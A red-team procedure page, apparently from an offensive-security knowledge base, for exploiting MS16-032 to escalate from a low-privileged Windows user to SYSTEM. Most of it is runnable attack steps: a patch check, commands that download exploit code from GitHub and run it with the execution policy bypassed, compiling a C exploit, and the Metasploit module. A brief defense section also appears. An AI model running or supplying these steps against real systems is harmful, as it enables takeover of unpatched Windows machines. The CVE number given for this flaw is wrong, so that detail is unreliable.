---
type: procedure
description: >-
  Exploit the MS16-032 vulnerability in Windows Secondary Logon Service to
  escalate privileges from low-privileged user to SYSTEM.
verified: true
submitted: false
created_at: '2023-04-06T03:56:30Z'
updated_at: '2024-01-01T00:00:00Z'
tactics:
  - '[[Privilege Escalation]]'
techniques:
  - '[[Exploitation for Privilege Escalation]]'
sub_techniques: []
tags:
  - eop
  - ms16-032
  - windows-privilege-escalation
commands:
  - '[[commands/check-windows-update-kb3139914]]'
  - '[[commands/download-invoke-ms16-032-ps1]]'
  - '[[commands/download-ms16-032-source-zip]]'
  - '[[commands/use-metasploit-ms16-032-exploit]]'
platforms:
  - Windows
tools:
  - '[[tools/Metasploit-Framework]]'
skill_level: intermediate
impact_level: high
detection_risk: high
validated: true
---

# MS16-032-Local-Privilege-Escalation

## Summary

This procedure exploits the MS16-032 (CVE-2016-0049) local privilege escalation vulnerability in the Windows Secondary Logon Service (seclogon), allowing an attacker with low-privileged access to obtain SYSTEM-level privileges on unpatched Windows 7, 8, 8.1, Server 2008 R2, and Server 2012 systems. The exploit leverages a race condition in token handle inheritance to spawn an elevated process.

## Description

MS16-032 stems from improper handling of access tokens by the Secondary Logon Service, enabling local attackers to elevate privileges without authentication. The target environment includes 32-bit and 64-bit versions of affected Windows OSes prior to the KB3139914 patch. The technical approach involves checking for patch status, downloading exploit payloads (PowerShell script or C source for binary), and executing them to inherit an elevated token from the service. Successful exploitation results in a SYSTEM shell, enabling further post-exploitation activities like data exfiltration or persistence. This is particularly valuable in red team engagements after initial access via phishing or other vectors.

## Requirements

1. Low-privileged user account on the target Windows system (e.g., standard user).
2. Unpatched system: Windows 7 SP1, Windows 8.1, Windows Server 2008 R2, or Windows Server 2012 (KB3139914 not installed).
3. Ability to execute PowerShell or CMD commands (bypass execution policy if needed).
4. For Metasploit: Existing Meterpreter session on the target and Metasploit Framework installed on the attacker machine.
5. Network access to GitHub for downloading payloads (or offline transfer via USB/other means).

## Defense

- Apply Microsoft security update KB3139914 or later to patch the vulnerability.
- Enforce principle of least privilege to limit low-priv user actions.
- Enable Windows Defender Exploit Guard and monitor for anomalous process creation (e.g., seclogon.exe spawning unexpected children) using Sysmon or EDR tools.
- Log PowerShell execution and network downloads; alert on connections to known exploit repositories.
- Restrict execution of unsigned scripts and binaries via AppLocker or WDAC.

## Objectives

1. Verify the target system is vulnerable to MS16-032.
2. Download and execute an exploit payload to escalate privileges.
3. Obtain a SYSTEM-level shell for further compromise.
4. Validate elevation by checking token privileges or spawning a high-integrity process.

## Instructions

### Step 1: Verify Patch Status

**Context**: Determine if the system is vulnerable by checking for the patching update KB3139914. This step ensures the exploit is applicable before proceeding, avoiding unnecessary actions on patched systems.

**Command** ([[commands/check-windows-update-kb3139914]]):

```cmd
wmic qfe list | findstr "3139914"
```

> This queries installed hotfixes. If no output is returned, the system is unpatched and vulnerable. If KB3139914 appears, the system is patched—abort the procedure.

**Expected Output**: Empty output indicates vulnerability; otherwise, details of the KB installation (e.g., "KB3139914 HotFixID=...").

### Step 2: Download PowerShell Exploit Script

**Context**: Retrieve the PowerShell-based exploit script from a trusted repository. This payload implements the race condition to inherit the elevated token. Run this on the target to avoid compilation needs.

**Command** ([[commands/download-invoke-ms16-032-ps1]]):

```powershell
$url = "https://raw.githubusercontent.com/FuzzySecurity/PowerShell-Suite/master/Invoke-MS16-032.ps1"; Invoke-WebRequest -Uri $url -OutFile "Invoke-MS16-032.ps1"
```

> Downloads the script to the current directory. Verify the file size (~5-10 KB) to ensure completeness.

**Expected Output**: Success message like "StatusCode: 200" and the file created.

### Step 3: Execute PowerShell Exploit

**Context**: Bypass execution policy if restricted, then run the script to trigger the privilege escalation. The script creates a malicious process that races to inherit the seclogon token.

**Instructions**: After download, execute:

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force; . .\Invoke-MS16-032.ps1
```

> The script attempts the race multiple times for reliability. If successful, it spawns a new PowerShell or CMD with SYSTEM privileges.

**Expected Output**: A new elevated shell prompt (e.g., "PS C:\Windows\system32>") or error if race fails—rerun if needed.

### Step 4: Alternative - Download and Prepare Binary Exploit

**Context**: For the C-based exploit, download the source and note that compilation requires Visual Studio on a Windows dev machine (transfer the compiled .exe to target). This is useful if PowerShell is heavily monitored.

**Command** ([[commands/download-ms16-032-source-zip]]):

```powershell
$url = "https://codeload.github.com/Meatballs1/ms16-032/zip/refs/heads/master"; Invoke-WebRequest -Uri $url -OutFile "ms16-032.zip"
```

> Downloads the source ZIP. Extract on a build machine, compile with Visual Studio (cl /O2 ms16-032.c), then transfer the .exe to target via SMB or other means.

**Expected Output**: ZIP file downloaded; after extraction and compilation, a ms16-032.exe binary.

**Instructions** (on target after transfer): Run the .exe:

```cmd
ms16-032.exe
```

> Similar to PS version, spawns elevated shell on success.

### Step 5: Alternative - Use Metasploit Module

**Context**: If a Meterpreter session exists (e.g., from initial access), load the MS16-032 module in Metasploit to automate escalation. This requires the attacker machine with Metasploit.

**Command** ([[commands/use-metasploit-ms16-032-exploit]]):

In msfconsole:

```bash
use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
set SESSION 1
exploit
```

> Replace SESSION with your Meterpreter session ID (use sessions -l to list). The module handles the race condition internally.

**Expected Output**: "Meterpreter session X opened" with elevated privileges; check with getuid (shows NT AUTHORITY\SYSTEM).
